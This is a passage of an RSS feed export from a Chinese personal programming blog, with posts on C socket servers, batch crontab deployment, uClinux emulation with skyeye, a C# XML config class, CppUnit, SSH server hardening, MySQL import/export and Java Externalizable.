}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Server: got connection from %s\n",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inet_ntoa(their_addr.sin_addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!fork()){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(send(new_fd, "hello, World!\n", 14, 0)==-1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("send");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(new_fd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(new_fd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(waitpid(-1, NULL, WNOHANG) &gt; 0);<br>}<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720093884615122/</guid>
    </item>
    <item>
      <title>
<![CDATA[批量添加任务计划crontab]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720118295581579/</link>
      <description>
<![CDATA[RTFSC<br>#!/bin/bash<br>cat &gt; cron.hjz &lt;&lt;EOF<br>*/5 * * * * rm -fr /home/hankjin/log/*<br>EOF<br><wbr>for host in `cat list.host`;<br>do<br>&nbsp;&nbsp;&nbsp; scp&nbsp; cron.hjz hankjin@host:/tmp/<br>&nbsp;&nbsp;&nbsp; ssh -n hankjin@host crontab /tmp/cron.hjz<br>done]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720118295581579/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用skyeye模拟开发uClinux]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095513214721/</link>
      <description>
<![CDATA[开发环境：Ubuntu<br>用到的工具：arm-elf-tools-20040427.sh&nbsp; uClinux-dist-20040408.tar.gz，从这里下载：<br>http://opensrc.sec.samsung.com/download/arm-elf-tools-20040427.sh<br>http://www.uclinux.org/pub/uClinux/dist/uClinux-dist-20040408.tar.gz<br>步骤：<br>#1. 安装编译连接工具<br>wget http://opensrc.sec.samsung.com/download/arm-elf-tools-20040427.sh<br>sed -i "s/tail/tail +n/" arm-elf-tools-20040427.sh <br>chmod +x arm-elf-tools-20040427.sh<br>sudo ./arm-elf-tools-20040427.sh<br>#2. 安装uClinux<br>wget http://www.uclinux.org/pub/uClinux/dist/uClinux-dist-20040408.tar.gz<br>tar xf uClinux-dist-20040408.tar.gz<br>cd uClinux-dist<br>#3. 编译uClinux<br>make menuconfig<br>#如果出错，则sudo apt-get install libncurses5-dev<br>#<style>BODY { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
P { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
DIV { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
TD { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
</style>&nbsp;&nbsp; (GDB) Vendor<br>#&nbsp;&nbsp;&nbsp;&nbsp; (ARMulator) GDB Products &nbsp; <br># <style>BODY { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
P { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
DIV { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
TD { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
</style>(linux-2.4.x) Kernel Version <br>#&nbsp; (uClibc) Libc Version &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>#[ ] Default all settings (lose changes)<br>#[ ] Customize Kernel Settings &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>#[ ] Customize Vendor/User Settings<br>#[ ] Update Default Vendor Settings &nbsp; <br>make dep<br>make<br>#4. 模拟<br>cat&gt; skyeye.conf&lt;&lt;EOF<br>#skyeye config file sample<br>cpu: arm7tdmi<br><br>mach: at91<br><br>mem_bank: map=M, type=RW, addr=0x00000000, size=0x00004000<br>mem_bank: map=M, type=RW, addr=0x01000000, size=0x00400000<br>mem_bank: map=M, type=R,&nbsp; addr=0x01400000, size=0x00400000, file=./boot.rom<br>#mem_bank: map=M, type=R,&nbsp; addr=0x01400000, size=0x00400000, file=./hjz.rom<br>mem_bank: map=M, type=RW, addr=0x02000000, size=0x00400000<br>mem_bank: map=M, type=RW, addr=0x02400000, size=0x00008000<br>mem_bank: map=M, type=RW, addr=0x04000000, size=0x00400000<br>mem_bank: map=I, type=RW, addr=0xf0000000, size=0x10000000<br>EOF<br>#<br>ln -s images/romfs.img boot.rom<br>skyeye -e linux-2.4.x/linux<br>#5. 开发自己的应用<br>cat&gt;test.c&lt;&lt;EOF<br>#include &lt;stdio.h&gt;<br>int main(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int i ;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; 6; i ++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("i=%d\n",i);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Hello, Embedded linux\n");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>}<br>EOF<br>#编译<br>arm-elf-gcc -Wl,-elf2flt -o test test.c<br>#制作romfs<br>sudo mkdir /mnt/tmp<br>sudo mount -o loop images/romfs.img /mnt/tmp<br>sudo mkdir hjzrom<br>sudo cp -r /mnt/tmp/* hjzrom<br>sudo cp test hjzrom/bin/<br>sudo genromfs -f hjz.rom -d hjzrom<br>#替换romfs 并模拟<br>sed -i "s/boot.rom/hjz.rom/" skyeye.conf<br>skyeye -e linux-2.4.x/linux<br><div></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>OS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095513214721/</guid>
    </item>
    <item>
      <title>
<![CDATA[一个C#的XML数据库访问类]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200942915452244/</link>
      <description>
<![CDATA[程序中不可避免的要用到配置文件或数据，对于数据量比较小的程序，部署数据库花费的时间就显得浪费了，因此用XML来存储不妨为一个很好的办法，而且结合C#的DataSet，我们可以很轻易的封装出一个代码简单而功能强大的数据访问类XMLConfig<br>config.xml<br>&lt;root&gt;<br>&nbsp; &lt;table1&gt;<br>&nbsp;&nbsp;&nbsp; &lt;rowName1&gt;hello&lt;/rowName1&gt;<br>&nbsp;&nbsp;&nbsp; &lt;rowName2&gt;World&lt;/rowName2&gt;<br>&nbsp; &lt;/table1&gt;<br>&nbsp; &lt;table1&gt;<br>&nbsp;&nbsp;&nbsp; &lt;rowName1&gt;hank&lt;/rowName1&gt;<br>&nbsp;&nbsp;&nbsp; &lt;rowName2&gt;Joke&lt;/rowName2&gt;&lt;!--table1, row1: ds.Tables["table1"].Rows[1]["rowName2"] --&gt;<br>&nbsp; &lt;/table1&gt;<br><br>&nbsp; &lt;table2&gt;<br>&nbsp; &lt;/table2&gt;<br>
&nbsp; &lt;table2&gt;<br>
&nbsp; &lt;/table2&gt;<br><br>
&nbsp; &lt;table3&gt;<br>
&nbsp; &lt;/table3&gt;<br>&lt;/root&gt;<br><br>&nbsp;&nbsp;&nbsp; class XMLConfig<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// XML文件名<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static string fileName;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 数据集<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static DataSet objDataSet;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 表名<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private string tableName;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private bool updated = false;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static XMLConfig()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fileName = "data//config.xml";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objDataSet = new DataSet();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objDataSet.ReadXml(fileName);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 获取一个表<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="tableName"&gt;表名&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public XMLConfig(string tableName)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.tableName = tableName;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 获取配置<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="index"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="row"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;returns&gt;&lt;/returns&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public object GetConfig(int index, string row)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return objDataSet.Tables[tableName].Rows[index][row];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 修改配置<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="index"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="row"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="value"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void SetConfig(int index, string row, string value)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objDataSet.Tables[tableName].Rows[index][row] = value;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; updated = true;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 析构函数,程序退出时,如果有修改,则把修改写回XML文件中<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~XMLConfig()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(updated)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objDataSet.WriteXml(fileName);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200942915452244/</guid>
    </item>
    <item>
      <title>
<![CDATA[C++单元测试:cppunit]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372011611222676/</link>
      <description>
<![CDATA[单元测试还是要认真做的, 做单元测试还是很烦的, cppunit 还是很强大的.<br>CPPUNIT 有几类对象, 主要分三类, <br><b>一是运行管理: 包括输出格式(html/xml...), 运行方式(GUI, CLI...), 输出文件(标准输出...)</b><br><b>二是Case管理: 主要分三级, Registry, TestSuite 和 TestCase.</b><br>一般每个测试类是一个TestSuite, 测试类中的每个测试方法是一个TestCase<br>若干TestCase组成一个TestSuite<br>然后TestSuite可以注册一个名称, 也可以注册到全局默认名称, 也可以两个都注册..<br>这些都可以使用cppunit提供的宏实现.<br><b>三是Case编写: 主要是Case的继承关系, 条件判断等.<br></b>一般继承自TestFixture即可, 可以使用CPPUNIT_ASSERT(condition), CPPUNIT_ASSERT_MESSAGE(msg, cond)等.<br><br>这里提供一个最简单的使用方法: 将运行管理的工作封装到"万能的主函数中", 然后用一种通用的方式编写Case.<br><b>依赖关系是: </b><br>main中通过Case名称或默认名称建的Suite, 而Case通过宏注册名称或默认名称, <br>然后从Suite中寻找Case, Case通过宏注册到Suite中.<br><br><b>0.1. 万能的主函数,<br></b>#include "test_inc.h"<b><br></b>int main(int argc, char *argv[]){<br>&nbsp;&nbsp;&nbsp; CppUnit::TestResult result;<br>&nbsp;&nbsp;&nbsp; CppUnit::TestResultCollector rc; <br>&nbsp;&nbsp;&nbsp; result.addListener (&amp;rc);<br>&nbsp;&nbsp;&nbsp; CppUnit::TestRunner run;<br>&nbsp;&nbsp;&nbsp; if(argc == 1){&nbsp;&nbsp; //如果没有参数,则运行所有的Case<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; run.addTest (CppUnit::TestFactoryRegistry::getRegistry().makeTest());<br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; for(int i = 1; i&lt;argc; i++){&nbsp;&nbsp; //如果有参数,则运行参数指定的Case<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; run.addTest (CppUnit::TestFactoryRegistry::getRegistry(argv[i]).makeTest());<br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; run.run (result);<br>&nbsp;&nbsp;&nbsp; CppUnit::TextOutputter outputter (&amp;rc, CppUnit::stdCOut());<br>&nbsp;&nbsp;&nbsp; outputter.write (); <br>&nbsp;&nbsp;&nbsp; return rc.wasSuccessful ()? 0 : 1;<br>}<br><b>0.2. 万能的头文件</b><br>#include &lt;cppunit/extensions/TestFactoryRegistry.h&gt;<br>#include &lt;cppunit/TestResult.h&gt;<br>#include &lt;cppunit/TestResultCollector.h&gt;<br>#include &lt;cppunit/TestRunner.h&gt;<br>#include &lt;cppunit/TextOutputter.h&gt;<br>#include &lt;cppunit/extensions/HelperMacros.h&gt;<br><br><b>0.3 万能的Makefile, 新的Case只要加到TEST_OBJ中就可以了</b><br>CPPUNIT=/path/to/cppunit<br>TEST_INC = -I$(CPPUNIT)/include <br>TEST_LIB = -L$(CPPUNIT)/lib -lcppunit<br>TEST_OBJ = test_main.o <br><br>all: test_main<br>&nbsp;&nbsp;&nbsp; ./test_main<br>test_main: $(TEST_OBJ)<br>&nbsp;&nbsp;&nbsp; $(CC)&nbsp; -o $@ $^&nbsp; $(TEST_LIB)<br>%.o : %.cpp<br>&nbsp;&nbsp;&nbsp; $(CC)&nbsp; -o $@ -c $&lt;&nbsp; $(TEST_INC)<br><br><b>1.1. 加一个Case.h</b><br>/** case1.h */<br>#include "test_inc.h"<br>class hjz_test:public CppUnit::TestFixture {<br>&nbsp;&nbsp;&nbsp; CPPUNIT_TEST_SUITE (hjz_test);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //创建一个TestSuite<br>&nbsp;&nbsp;&nbsp; CPPUNIT_TEST (test_case1);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //在TestSuite中加一个testcase<br>&nbsp;&nbsp;&nbsp; CPPUNIT_TEST (test_case2);<br>&nbsp;&nbsp;&nbsp; CPPUNIT_TEST_SUITE_END (); <br><br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp; void setUp (){} //你懂的<br>&nbsp;&nbsp;&nbsp; void tearDown (){}<br><br>&nbsp;&nbsp;&nbsp; void test_case1();<br>&nbsp;&nbsp;&nbsp; void test_case2 (); <br>};<br><br><b>1.2. 加一个Case.cpp</b><br>/** case1.cpp */<br>#include "case1.h"<br>CPPUNIT_TEST_SUITE_REGISTRATION (hjz_test);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //全局注册, 不用名称即可取得<br>CPPUNIT_TEST_SUITE_NAMED_REGISTRATION (hjz_test, "hjz");&nbsp;&nbsp; //姓名注册, 后面的字符串是给main用的参数<br>void hjz_test::test_case1(){<br>&nbsp;&nbsp;&nbsp; CPPUNIT_ASSERT(1 == 1);<br>}<br>void hjz_test::test_case2(){<br>&nbsp;&nbsp;&nbsp; CPPUNIT_ASSERT_MESSAGE("1+1!=2?", 1+1 != 2);<br>}<br><br><b>1.3. 加到Makefile里</b><br>TEST_OBJ = test_main.o case1.o<br><br><b>1.4 测试</b><br>make<br>./test_main<br>或./test_main hjz<br><br>!!!FAILURES!!!<br>Test Results:<br>Run:&nbsp; 2&nbsp;&nbsp; Failures: 1&nbsp;&nbsp; Errors: 0<br><br><br>1) test: hjz_test::test_case2 (F) line: 23 case1.cpp<br>assertion failed<br>- Expression: 1+1 != 2<br>- 1+1!=2?]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372011611222676/</guid>
    </item>
    <item>
      <title>
<![CDATA[三个新框架，Android，Acegi和JBPM]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720071019115224379/</link>
      <description>
<![CDATA[<P>Android应该是个移动开发的框架，基于Eclipse的，貌似不错，可惜我的电脑承受不起了，明天去公司装。</P>
<P>Acegi貌似是个身份验证框架，其实Open-ID非常好，可惜推广做的不好。</P>
<P>JBPM是个工作流管理框架，下载了一个老兄的demo，没去看。</P>
<P>Java的框架出的比学的快</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720071019115224379/</guid>
    </item>
    <item>
      <title>
<![CDATA[Linux服务器限制ssh登录，查看登录日志]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010103115314780/</link>
      <description>
<![CDATA[网络上的服务器很容易受到攻击，最惨的就是被人登录并拿到root权限。有几个简单的防御措施：<br><b>1. 修改ssh服务的默认端口。</b><br>ssh服务的默认端口是22，一般的恶意用户也往往扫描或尝试连接22端口。所以第一步就是修改这个默认端口<br>打开/etc/ssh/sshd_config，找到<br>Port 22<br>然后将22修改为其它没有被占用的端口，如1022。最好在1-1024之间，防止与用户进程端口冲突。<br>然后重启sshd即可<br>sudo /etc/init.d/ssh restart<br><br><b>2. 限制IP</b><br>首先修改/etc/hosts.allow文件，将可访问服务器ssh服务的客户IP加入其中，格式如下<br>sshd:192.168.1.0/255.255.255.0<br>sshd: 202.114.23.45<br>sshd: 211.67.67.89<br>然后修改/etc/hosts.deny文件，加入禁用其它客户连接ssh服务<br>sshd: ALL<br><br><b>3.升级服务器</b><br>矛与盾的故事永远没有结局，经常升级服务器是必备的<br>apt-get update<br>apt-get dist-upgrade<br><br><b>4.检查登录日志</b><br>不怕一万，就怕万一，没有攻不破的城堡，有些小偷可能是小白，或者来也匆匆，去也匆匆，在服务器上做完坏事没有擦除痕迹，所以经常检查登录日志，也是一种安全手段<br>sudo vi /var/log/auth.log<br>可以看到很多有用的信息：如<br>Oct 25 04:05:46 cbibgw sshd[6817]: Accepted password for cbib from 192.168.1.122<br>&nbsp;port 4831 ssh2<br>表示十月25日4点5分有人从内网192.168.1.122成功登录ssh服务<br>Oct 26 07:15:24 cbibgw sshd[6516]: refused connect from ::ffff:178.91.66.193 (::<br>ffff:178.91.66.193)<br>表示十月26日7点15分有人从178.91.68.193尝试登录ssh服务，但是因为不在hosts.allow列表中，所以登录失败。<br><span>百度查询可以知道178.91.68.193是一个哈萨克斯坦的IP<br></span>这个登录可能是错误登录，也可以是扫描或其它操作。一次操作可以忽略，但如果有许多来自这个IP的连接请求，则要注意下。<br>如果auth.log中有大量的cron之间的信息，可以用grep过滤后查看，如<br>grep -v 'CRON' /var/log/auth.log.0|more]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010103115314780/</guid>
    </item>
    <item>
      <title>
<![CDATA[Mysql导入导出数据]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200782285558777/</link>
      <description>
<![CDATA[<P>导入数据：</P>
<P>load data infile "E:\\t1.txt" into table tmp fields terminated by ',' enclosed by '"' lines terminated by '\r\n'</P>
<P>导出数据</P>
<P>select * from tmp into outfile "E:\\t1.txt"</P>
<P>详见reference</P>
<P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>DataBase</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200782285558777/</guid>
    </item>
    <item>
      <title>
<![CDATA[[转]Externalizable]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200782782613782/</link>
      <description>
<![CDATA[<P align=left>Externalizable 继承自Serializable，简单的说，Externalizable可以自己控制序列化的内容。</P>
<P align=left>下面是序列化和外部化在代码级的关联方式：</P>
<P align=left>public interface Serializable {} </P>
<P align=left>public interface Externalizable extends Serializable {<BR>&nbsp;&nbsp;void readExternal(ObjectInput in);<BR>&nbsp;&nbsp;void writeExternal(ObjectOutput out);<BR>} </P>
<P align=left>序列化和外部化的主要区别</P>
<P align=left>外部化和序列化是实现同一目标的两种不同方法。下面让我们分析一下序列化和外部化之间的主要区别。</P>
<P align=left>通过Serializable接口对对象序列化的支持是内建于核心 API 的，但是java.io.Externalizable的所有实现者必须提供读取和写出的实现。Java 已经具有了对序列化的内建支持，也就是说只要制作自己的类java.io.Serializable，Java 就会试图存储和重组你的对象。如果使用外部化，你就可以选择完全由自己完成读取和写出的工作，Java 对外部化所提供的唯一支持是接口：</P>
<P align=left>voidreadExternal(ObjectInput in)<BR>void writeExternal(ObjectOutput out) </P>
<P align=left>现在如何实现readExternal() 和writeExternal() 就完全看你自己了。</P>
<P align=left>序列化会自动存储必要的信息，用以反序列化被存储的实例，而外部化则只保存被存储的类的标识。当你通过java.io.Serializable接口序列化一个对象时，有关类的信息，比如它的属性和这些属性的类型，都与实例数据一起被存储起来。在选择走Externalizable这条路时，Java 只存储有关每个被存储类型的非常少的信息。</P>
<P align=left>每个接口的优点和缺点</P>
<P align=left>Serializable接口</P>
<P align=left>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 优点：内建支持</P>
<P align=left>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 优点：易于实现</P>
<P align=left>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 缺点：占用空间过大</P>
<P align=left>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 缺点：由于额外的开销导致速度变比较慢</P>
<P align=left>Externalizable接口</P>
<P align=left>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 优点：开销较少（程序员决定存储什么）</P>
<P align=left>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 优点：可能的速度提升</P>
<P align=left>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 缺点：虚拟机不提供任何帮助，也就是说所有的工作都落到了开发人员的肩上。</P>
<P align=left>在两者之间如何选择要根据应用程序的需求来定。Serializable通常是最简单的解决方案，但是它可能会导致出现不可接受的性能问题或空间问题；在出现这些问题的情况下，Externalizable可能是一条可行之路。</P>
